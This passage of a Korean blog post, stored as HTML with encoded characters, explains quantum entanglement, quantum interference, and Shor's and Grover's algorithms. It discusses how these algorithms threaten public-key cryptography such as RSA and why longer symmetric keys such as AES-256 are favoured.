href="#2-2-&#xC591;&#xC790;-&#xC5BD;&#xD798;-Entanglement" class="headerlink" title="2.2 &#xC591;&#xC790; &#xC5BD;&#xD798; (Entanglement)"></a>2.2 &#xC591;&#xC790; &#xC5BD;&#xD798; (Entanglement)</h3><p>&#xC591;&#xC790; &#xC5BD;&#xD798;&#xC740; &#xB450; &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xAC00; &#xC11C;&#xB85C; &#xB3C5;&#xB9BD;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xBB36;&#xC774;&#xB294; &#xD604;&#xC0C1;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xD558;<strong>&#xB098;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; &#xBC14;&#xB00C;&#xBA74;, &#xADF8;&#xC640; &#xC5BD;&#xD78C; &#xB2E4;&#xB978; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xB3C4; &#xC989;&#xC2DC; &#xBCC0;&#xD654;</strong>&#xD55C;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;. &#xC544;&#xC778;&#xC288;&#xD0C0;&#xC778;&#xC740; &#xC774; &#xD604;&#xC0C1;&#xC744; &#xB450;&#xACE0; Spooky action at a distance(&#xC73C;&#xC2A4;&#xC2A4;&#xD55C; &#xC6D0;&#xACA9; &#xC791;&#xC6A9;)&#xB77C;&#xBA70; &#xC758;&#xBB38;&#xC744; &#xC81C;&#xAE30;&#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4;, &#xBCA8;(Bell)&#xC758; &#xBD80;&#xB4F1;&#xC2DD; &#xC2E4;&#xD5D8;&#xACFC; &#xC544;&#xC2A4;&#xD399;&#xD2B8;(Alain Aspect, 1982) &#xB4F1;&#xC758; &#xC2E4;&#xD5D8;&#xC744; &#xD1B5;&#xD574; &#xC774; &#xD604;&#xC0C1;&#xC5D0; &#xC2E4;&#xC81C;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC785;&#xC99D;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</p><p>&#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xC5BD;&#xD798;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xD050;&#xBE44;&#xD2B8; &#xAC04;&#xC758; &#xACC4;&#xC0B0; &#xC758;&#xC874;&#xC131;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5BD;&#xD798;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC5F0;&#xC0B0;&#xC774; &#xBCD1;&#xB82C;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xACE0;, &#xC815;&#xBCF4;&#xC758; &#xC0C1;&#xAD00;&#xAD00;&#xACC4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB97C; &#xAC15;&#xD654;&#xD558;&#xAC70;&#xB098; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xC815;&#xB2F5;&#xC774; &#xB418;&#xB294; &#xD328;&#xD134;&#xC744; &#xAC15;&#xD654;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC5BD;&#xD78C; &#xD050;&#xBE44;&#xD2B8; &#xC30D; &#xC911; &#xD558;&#xB098;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xBA74;, &#xB2E4;&#xB978; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xB418;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC815;&#xBCF4; &#xC804;&#xB2EC;, &#xC0C1;&#xD0DC; &#xC81C;&#xC5B4;, &#xC624;&#xB958; &#xC815;&#xC815; &#xAC19;&#xC740; &#xACE0;&#xAE09; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xC5BD;&#xD798; &#xD604;&#xC0C1;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xBCD1;&#xB82C; &#xCC98;&#xB9AC;&#xB97C; &#xB118;&#xC5B4;&#xC11C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xC5F0;&#xC0B0;&#xB9DD;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB290; &#xAE30;&#xBC18;&#xC774; &#xB3FC;&#xC694;.</p><h3 id="2-3-&#xC591;&#xC790;-&#xAC04;&#xC12D;-Interference"><a href="#2-3-&#xC591;&#xC790;-&#xAC04;&#xC12D;-Interference" class="headerlink" title="2.3 &#xC591;&#xC790; &#xAC04;&#xC12D; (Interference)"></a>2.3 &#xC591;&#xC790; &#xAC04;&#xC12D; (Interference)</h3><p>&#xC591;&#xC790; &#xAC04;&#xC12D;&#xC740; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xC5D0; &#xC788;&#xB294; &#xC5EC;&#xB7EC; &#xACBD;&#xB85C; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xC73C;&#xB85C; &#xD5A5;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xD655;&#xB960;&#xC744; &#xAC15;&#xD654;&#xD558;&#xACE0;, &#xC798;&#xBABB;&#xB41C; &#xACBD;&#xB85C;&#xC758; &#xD655;&#xB960;&#xC744; &#xC57D;&#xD654;&#xC2DC;&#xD0A4;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC774; &#xAC04;&#xC12D;&#xC744; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC815;&#xD558;&#xC5EC; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC62C;&#xBC14;&#xB978; &#xACB0;&#xACFC;&#xAC00; &#xB354; &#xB192;&#xC740; &#xD655;&#xB960;&#xB85C; &#xAD00;&#xCE21;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; &#xAC00;&#xB2A5;&#xD55C; &#xD574; &#xC911;&#xC5D0;&#xC11C; &#xC62C;&#xBC14;&#xB978; &#xD574;&#xC758; &#xD655;&#xB960;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xAC15;&#xD654;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574;&#xC11C; N&#xAC1C;&#xC758; &#xB370;&#xC774;&#xD130; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xB294;&#xB370;&#xC5D0; &#xACE0;&#xC804;&#xC801;&#xC73C;&#xB85C;&#xB294; O(N) &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; O(&#x221A;n)&#xB9CC;&#xC5D0; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC591;&#xC790; &#xC911;&#xCCA9;&#xC774; &#xACC4;&#xC0B0;&#xC758; &#xD3ED;&#xC744; &#xB113;&#xD788;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xBA74; &#xC591;&#xC790; &#xAC04;&#xC12D;&#xC740; &#xADF8; &#xD3ED; &#xC911;&#xC5D0;&#xC11C; &#xC815;&#xB2F5;&#xB9CC; &#xB0A8;&#xAE30;&#xB294; &#xD544;&#xD130; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-&#xC591;&#xC790;-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-&#xC591;&#xC790;-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3. &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3. &#xC591;&#xC790; &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h2><p>&#xC55E;&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBD24;&#xB358; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xD2B9;&#xC131;&#xB4E4;(&#xC911;&#xCCA9;, &#xC5BD;&#xD798;, &#xAC04;&#xC12D;)&#xC740; &#xB2E8;&#xC21C;&#xD788; &#x2018;&#xC2E0;&#xAE30;&#xD55C; &#xBB3C;&#xB9AC; &#xD604;&#xC0C1;&#x2019;&#xC73C;&#xB85C; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC544;&#xC694;. &#xC774; &#xD2B9;&#xC131;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xB85C;&#xB294; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B4; &#xBB38;&#xC81C;&#xB97C; &#xD6E8;&#xC52C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD480; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; &#xC591;&#xC790; &#xACC4;&#xC0B0;&#xC758; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xAC00; &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xACFC; &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774;&#xC5D0;&#xC694;. &#xC774; &#xB450; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#x201C;&#xACE0;&#xC804; &#xC554;&#xD638;&#xB97C; &#xAE68;&#xAE30; &#xC704;&#xD574;&#x201D; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xAC74; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;, &#xADF8; &#xACC4;&#xC0B0; &#xC6D0;&#xB9AC;&#xAC00; &#xACB0;&#xAD6D; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C0;&#xAE08; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC554;&#xD638; &#xCCB4;&#xACC4;&#xC758; &#xC548;&#xC804;&#xC131;&#xC744; &#xD754;&#xB4E4;&#xC5B4;&#xBC84;&#xB838;&#xC5B4;&#xC694;.</p><h3 id="3-1-&#xC1FC;&#xC5B4;-Shor-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-1-&#xC1FC;&#xC5B4;-Shor-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3.1 &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3.1 &#xC1FC;&#xC5B4;(Shor) &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h3><p>&#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; 1994&#xB144; Peter Shor&#xAC00; &#xC81C;&#xC548;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C;, <strong>&#xB2E4;&#xD56D; &#xC2DC;&#xAC04; &#xC548;&#xC5D0; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;</strong>&#xB97C; &#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C;&#xB294; &#xD070; &#xC218;&#xC77C;&#xC218;&#xB85D; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xAC00; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xC5B4;&#xB824;&#xC6CC;&#xC9C0;&#xACE0;, 2048 &#xBE44;&#xD2B8;&#xC9DC;&#xB9AC; RSA &#xD0A4;&#xB97C; &#xD480;&#xB824;&#xBA74; &#xC218;&#xC2ED;&#xC5B5;&#xB144;&#xC774; &#xAC78;&#xB9B4; &#xC815;&#xB3C4;&#xB85C; &#xBE44;&#xD604;&#xC2E4;&#xC801;&#xC774;&#xC9C0;&#xB9CC;, &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xD56D; &#xC2DC;&#xAC04; &#xC548;&#xC5D0; &#xB05D;&#xB0BC; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD588;&#xC5B4;&#xC694;.</p><p>&#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xB294; &#xC870;&#xAE08; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD558;&#xBA74;, &#xC591;&#xC790; &#xD478;&#xB9AC;&#xC5D0; &#xBCC0;&#xD658;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC218;&#xC5F4;&#xC758; &#xC8FC;&#xAE30;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC8FC;&#xAE30;&#xB97C; &#xC54C;&#xBA74; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xC18C;&#xC778;&#xC218;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xAC70;&#xB4E0;&#xC694;. </p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image3.png" alt></p><p>&#xC774; &#xADF8;&#xB9BC;&#xC740; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xB2E8;&#xC21C;&#xD654;&#xD574;&#xC11C; &#xD45C;&#xD604;&#xD55C; &#xD68C;&#xB85C;&#xC778;&#xB370;&#xC694;. &#xC67C;&#xCABD;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB4E4;&#xC740; &#xC785;&#xB825; &#xC0C1;&#xD0DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; Hadamard &#xAC8C;&#xC774;&#xD2B8;(H)&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC918;&#xC694;. &#xADF8; &#xB2E4;&#xC74C;&#xC5D0; &#xAC01; &#xD050;&#xBE44;&#xD2B8;&#xB4E4;&#xC774; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xAC70;&#xB4ED;&#xC81C;&#xACF1; &#xD615;&#xD0DC;&#xC758; Ua^{2^{n-1}}&#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74;&#xC11C;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC5F4;&#xC758; &#xC8FC;&#xAE30;&#xC131;&#xC744; &#xBC18;&#xC601;&#xD558;&#xB294; &#xC704;&#xC0C1; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xAC8C; &#xB418;&#xACE0;, &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC5ED; &#xC591;&#xC790; &#xD478;&#xB9AC;&#xC5D0; &#xBCC0;&#xD658;(QFT&#x207B;&#xB9;)&#xC744; &#xC801;&#xC6A9;&#xD574;&#xC11C; &#xC8FC;&#xAE30; &#xC815;&#xBCF4;&#xB97C; &#xCE21;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC694;.</p><p>&#xC0AC;&#xC2E4; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B8; &#xAC83; &#xAC19;&#xC544;&#xC694;. &#xC608;&#xC804;&#xC5D0; &#xC591;&#xC790; &#xC554;&#xD638;&#xD559; &#xC2DC;&#xD5D8;&#xC5D0;&#xC11C; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC591;&#xC790; &#xD68C;&#xB85C; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;, B+ &#xB9DE;&#xC558;&#xAC70;&#xB4E0;&#xC694;. </p><p>&#xC544;&#xBB34;&#xD2BC; &#xC774;&#xAC8C; &#xC65C; &#xC911;&#xC694;&#xD558;&#xB0D0;&#xBA74;, RSA, Diffie&#x2013;Hellman, ECDSA &#xAC19;&#xC740; <strong>&#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xCCB4;&#xACC4;&#xAC00; &#x2018;&#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xAC00; &#xC5B4;&#xB835;&#xB2E4;&#x2019;&#xB294; &#xAC00;&#xC815;</strong> &#xC704;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. &#xC989;, &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xD604;&#xC2E4;&#xD654;&#xB41C;&#xB2E4;&#xBA74;, &#xC6B0;&#xB9AC;&#xAC00; &#xC9C0;&#xAE08; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC778;&#xD130;&#xB137; &#xBCF4;&#xC548;&#xC5D0; &#xC704;&#xD611;&#xC774; &#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xBB3C;&#xB860; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC815;&#xB9D0; &#xAC15;&#xB825;&#xD558;&#xC9C0;&#xB9CC;, &#xD604;&#xC2E4;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xC9C1; &#xADF8;&#xB807;&#xAC8C; &#xB9CE;&#xC740; &#xC548;&#xC815;&#xC801;&#xC778; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(logical qubit)&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xC5B4;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC7A5;&#xC740; RSA&#xB97C; &#xBC14;&#xB85C; &#xAE68;&#xB294; &#xC218;&#xC900;&#xC740; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;, &#xC5B8;&#xC820;&#xAC00;&#xB294; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xD559;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(PQC)&#xB85C;&#xC758; &#xC804;&#xD658;&#xB3C4; &#xD65C;&#xBC1C;&#xD788; &#xC5F0;&#xAD6C;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. PQC&#xB294; &#xB610; &#xD558;&#xB098;&#xC758; &#xD070; &#xC8FC;&#xC81C;&#xC77C; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xB2E4;&#xB904;&#xBCFC;&#xAC8C;&#xC694;. </p><h3 id="3-2-&#xADF8;&#xB85C;&#xBC84;-Grover-&#xC54C;&#xACE0;&#xB9AC;&#xC998;"><a href="#3-2-&#xADF8;&#xB85C;&#xBC84;-Grover-&#xC54C;&#xACE0;&#xB9AC;&#xC998;" class="headerlink" title="3.2 &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;"></a>3.2 &#xADF8;&#xB85C;&#xBC84;(Grover) &#xC54C;&#xACE0;&#xB9AC;&#xC998;</h3><p>&#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <strong>&#xBE44;&#xC815;&#xB82C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD56D;&#xBAA9;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;</strong>&#xC774;&#xC5D0;&#xC694;. &#xB9CC;&#xC57D; &#xC5B4;&#xB5A4; &#xBB38;&#xC81C;&#xC758; &#xB2F5;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xACBD;&#xC6B0;&#xB97C; &#xD558;&#xB098;&#xC529; &#xC2DC;&#xB3C4;&#xD574;&#xBCF8;&#xB2E4;&#xACE0; &#xD560; &#xB54C; &#xACE0;&#xC804;&#xC801;&#xC778; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C;&#xB294; N&#xAC1C;&#xC758; &#xD6C4;&#xBCF4;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xD3C9;&#xADE0;&#xC801;&#xC73C;&#xB85C; N/2&#xBC88; &#xC2DC;&#xB3C4;&#xD574;&#xC57C; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xC57D; &#x221A;N&#xBC88;&#xB9CC;&#xC5D0; &#xC815;&#xB2F5;&#xC744; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xAC8C; &#xAC00;&#xB2A5;&#xD55C; &#xC774;&#xC720;&#xB294; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC911;&#xCCA9;(superposition)&#xACFC; &#xAC04;&#xC12D;(interference)&#xC744; &#xC774;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. </p><p>&#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xC0C1;&#xD0DC;&#xB97C; &#xD55C;&#xAEBC;&#xBC88;&#xC5D0; &#xC911;&#xCCA9;&#xC2DC;&#xCF1C;&#xC11C;, &#xBAA8;&#xB4E0; &#xD6C4;&#xBCF4;&#xAC00; &#xB3D9;&#xC2DC;&#xC5D0; &#xACC4;&#xC0B0;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2E4;&#xC74C;, &#xC815;&#xB2F5; &#xC0C1;&#xD0DC;&#xB9CC; &#xC704;&#xC0C1;&#xC744; &#xBC18;&#xC804;&#xC2DC;&#xCF1C; &#xD45C;&#xC2DC;&#xD558;&#xB294; &#xC624;&#xB77C;&#xD074; &#xC5F0;&#xC0B0;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xACE0;, &#xAC04;&#xC12D;&#xC744; &#xD1B5;&#xD574; &#xC815;&#xB2F5;&#xC758; &#xD655;&#xB960; &#xC9C4;&#xD3ED;&#xB9CC; &#xD06C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBC18;&#xBCF5;&#xD574;&#xC694;. &#xADF8;&#xB7FC; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xCE21;&#xC815;&#xD558;&#xBA74; &#xC815;&#xB2F5;&#xC77C; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xC0C1;&#xD0DC;&#xAC00; &#xB0A8;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;.</p><p>&#xC774;&#xB7F0; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xB300;&#xADDC;&#xBAA8; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAC80;&#xC0C9;&#xC774;&#xB098;, &#xBA38;&#xC2E0; &#xB7EC;&#xB2DD; &#xBB38;&#xC81C; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC758; &#xC751;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC694;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC2DC;&#xC5D0; &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xB098; &#xD574;&#xC2DC; &#xAE30;&#xBC18; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xAC15;&#xB3C4;&#xB97C; &#xC808;&#xBC18;&#xC73C;&#xB85C; &#xB0AE;&#xCD9C; &#xC218; &#xC788;&#xB294; &#xC704;&#xD611;&#xC774;&#xAE30;&#xB3C4; &#xD574;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; AES-128 &#xC554;&#xD638;&#xB97C; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4; &#xD558;&#xB824;&#xBA74; &#xACE0;&#xC804;&#xC801;&#xC73C;&#xB85C;&#xB294; 2^128&#xBC88;&#xC744; &#xC2DC;&#xB3C4;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; 2^64&#xBC88; &#xB9CC;&#xC5D0; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xACC4;&#xC0B0;&#xC774; &#xB098;&#xC640;&#xC694;.</p><p>&#xBB3C;&#xB860; &#xADF8;&#xB85C;&#xBC84; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC1FC;&#xC5B4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xCC98;&#xB7FC; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xB97C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xB108;&#xB728;&#xB9AC;&#xC9C0;&#xB294; &#xC54A;&#xC9C0;&#xB9CC;, &#x2018;&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xACF5;&#xAC1C;&#xD0A4; &#xC554;&#xD638;&#xB9CC; &#xC704;&#xD611;&#xD558;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xC5D0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xC900;&#xB2E4;&#x2019;&#xB294; &#xC810;&#xC744; &#xBA85;&#xD655;&#xD788; &#xBCF4;&#xC5EC;&#xC92C;&#xC5B4;&#xC694; . &#xADF8;&#xB798;&#xC11C; &#xBCF4;&#xC548; &#xC5C5;&#xACC4;&#xC5D0;&#xC11C;&#xB294; <strong>AES-256&#xCC98;&#xB7FC; &#xAE34; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; 